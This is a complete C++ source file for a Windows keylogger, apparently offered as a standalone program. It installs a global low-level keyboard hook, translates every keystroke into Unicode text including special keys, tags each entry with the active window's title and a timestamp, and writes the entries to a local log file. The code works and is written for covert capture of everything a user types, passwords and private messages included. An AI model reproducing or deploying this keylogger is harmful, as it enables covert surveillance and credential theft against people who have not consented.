#pragma comment(lib, "User32.lib")
#include <iostream>
#include <windows.h>
#include <fstream>
#include <string>
#include <Winuser.h>
#include <ctime>
#include <chrono>

/* g_prevWindow is called globally because there is not way to pass it the hook callback function as an argument and is need to update the log file */

std::wstring g_prevWindow;

/* getDate() is called on each log, it uses sprintf to easily get the format we want [DD-MM-YYYY HH:MM:SS], returns a wide string to be written in wide ofstream */

std::wstring getDate() {
	struct tm* timeinfo;
	wchar_t timestr[21];
	time_t rawtime;

	time(&rawtime);
	timeinfo = localtime(&rawtime);
	swprintf(timestr, L"[%02d-%02d-%d %02d:%02d:%02d]", timeinfo->tm_mday, timeinfo->tm_mon + 1, timeinfo->tm_year + 1900, timeinfo->tm_hour, timeinfo->tm_min, timeinfo->tm_sec);
	return (timestr);
}

/* getWindowTitle() is also called on each log, it gets the the foreground process ID then calls GetWindowText to get the window title, returns a wide string to be written in wide ofstream */

std::wstring getWindowTitle(){
	HWND fgw = GetForegroundWindow();
	wchar_t windowtitle[256];

	GetWindowTextW(fgw, windowtitle, sizeof(windowtitle));
	return (windowtitle);
}

/* writeLogs() Writes the date, window title and buffer content to the logfile.
the local needs to be associated with imbue() to the wide file stream in order to write any unicode to the file */

void writeLogs(std::wstring buf, std::wstring windowTitle) {
	const std::locale utf8_locale = std::locale("en_US.UTF-8");
	std::wofstream logfile;

	logfile.open("logs.txt", std::ios::app);
	logfile.imbue(utf8_locale);
	logfile << getDate();
	logfile << " - \'";
	logfile << windowTitle;
	logfile << "' - ";
	logfile << buf << std::endl;
	logfile.close();
}

/* TranslateKeys() is called on each keypress and simply converts the key press from vkCode to a writable character
-if vkCode == special key: returns a descriptive wstring for that key.
-else ToUnicodeEx() is called to return the proper unicode to handle all languages and special characters.*/

std::wstring translateKeys(DWORD vkCode, DWORD scanCode){
	std::wstring result;

	if (vkCode == VK_SPACE)
		result = L" ";
	else if (vkCode == VK_RETURN)
		result = L"\n";
	else if (vkCode == VK_BACK)
		result = L"[DEL]";
	else if (vkCode == VK_TAB)
		result = L"\t";
	else if (vkCode == VK_LSHIFT || vkCode == VK_RSHIFT)
		result = L"[SHIFT]";
	else if (vkCode == VK_LCONTROL || vkCode == VK_RCONTROL)
		result = L"[CTRL]";
	else if (vkCode == VK_MENU)
		result = L"[ALT]";
	else if (vkCode == VK_CAPITAL)
		result = L"[CAPS]";
	else if (vkCode == VK_ESCAPE)
		result = L"[ESC]";
	else if (vkCode == VK_LEFT)
		result = L"[LEFT ARROW]";
	else if (vkCode == VK_RIGHT)
		result = L"[RIGHT ARROW]";
	else if (vkCode == VK_UP)
		result = L"[UP ARROW]";
	else if (vkCode == VK_DOWN)
		result = L"[DOWN ARROW]";
	else if (vkCode == VK_SNAPSHOT)
		result = L"[PRINT SCREEN]";
	else if (vkCode == VK_NUMLOCK)
		result = L"[NUMLOCK]";
	else if (vkCode == VK_LWIN)
		result = L"[WINDOWS]";
	else if (vkCode == 255)
		result = L"[FN]";
	else if (vkCode >= 112 && vkCode <=120){
		result = L"[F";
		result += (wchar_t)vkCode-63; // 112-63=49(ascii for '1');		
		result += ']';
	}
	else if (vkCode == 121)
		result = L"[F10]";
	else if (vkCode == 122)
		result = L"[F11]";
	else if (vkCode == 123)
		result = L"[F12]";
	else{
		HWND hForegroundProcess = GetForegroundWindow();
		BYTE lpKeyState[256] = {0};
		wchar_t buff[2];
		DWORD dwThreadID = GetWindowThreadProcessId(hForegroundProcess, NULL);
		HKL keyboardLayout = GetKeyboardLayout(dwThreadID);
		GetKeyState(VK_SHIFT);
        GetKeyState(VK_MENU);
		if (GetKeyboardState(lpKeyState) == 0){
			std::cout << "!!!!!!!! ERROR IN KEYBOARD STATE" << std::endl; // add proper error handling here
		}
		int ret = ToUnicodeEx(vkCode, scanCode, lpKeyState, buff, 2, 0, keyboardLayout);
		result += buff[0];
	}
	return result;
}

/* The CallBack function needed by SetWindowsHookEx to handle the low-level keyboard hooks */

LRESULT CALLBACK keyboardHook(int code, WPARAM wParam, LPARAM lParam){
    KBDLLHOOKSTRUCT *s = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
    std::wstring finalChar;
	static std::wstring buf; // static to no reset after each keyboardHook call
	std::wstring currentWindow;

    if (wParam == WM_KEYDOWN){
		currentWindow = getWindowTitle();
		// NEED TO FIX: first time program enters it prints 1 char
		if (buf.length() >= 100 || (currentWindow != g_prevWindow && buf.length() > 0))
				{
					writeLogs(buf, g_prevWindow);
					buf.clear();
					g_prevWindow = currentWindow;
				}
        finalChar = translateKeys(s->vkCode, s->scanCode);
        buf += finalChar;
    }

    return CallNextHookEx(NULL, code, wParam, lParam);
}


void main() {
    HHOOK keyboard;
    
    g_prevWindow = getWindowTitle();
    keyboard = SetWindowsHookEx(WH_KEYBOARD_LL, &keyboardHook, 0, 0);
    MSG message;
    while (GetMessage(&message, NULL, NULL, NULL) > 0) {
        TranslateMessage(&message);
        DispatchMessage(&message);
    }
    UnhookWindowsHookEx(keyboard);
}